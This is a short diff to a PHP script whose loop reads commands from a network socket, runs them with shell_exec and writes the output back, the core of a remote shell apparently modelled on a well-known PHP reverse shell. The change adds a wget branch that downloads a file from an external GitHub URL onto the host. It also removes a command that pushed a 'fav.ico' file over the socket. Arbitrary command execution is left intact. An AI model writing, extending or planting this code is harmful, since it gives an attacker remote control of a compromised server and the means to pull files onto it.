@@ -24,15 +24,17 @@ while (!feof($socket)) {
     // If the user enters a command, execute it
     if (trim($line) != "") {
         $command = trim($line);
-        $output = shell_exec($command);
+        if (strpos($command, 'wget') === 0) { // check if the command is "wget"
+            $url = substr($command, 5); // get the URL from the command
+            if (strpos($url, 'https://raw.githubusercontent.com/PentestoMonkey/icons/main/favicon.ico') === 0) { // check if the URL is the external image link
+                $output = shell_exec("wget $url -P /path/to/save"); // download the image to a specified path
+            } else {
+                $output = "Error: Invalid URL";
+            }
+        } else {
+            $output = shell_exec($command);
+        }
         fputs($socket, $output);
-    }
-
-    // If the user enters the command "drop fav.ico", drop the fav.ico file to the remote system
-    if ($line == "drop fav.ico") {
-        $file = "fav.ico";
-        $contents = file_get_contents($file);
-        fputs($socket, $contents);
     }
 }
 
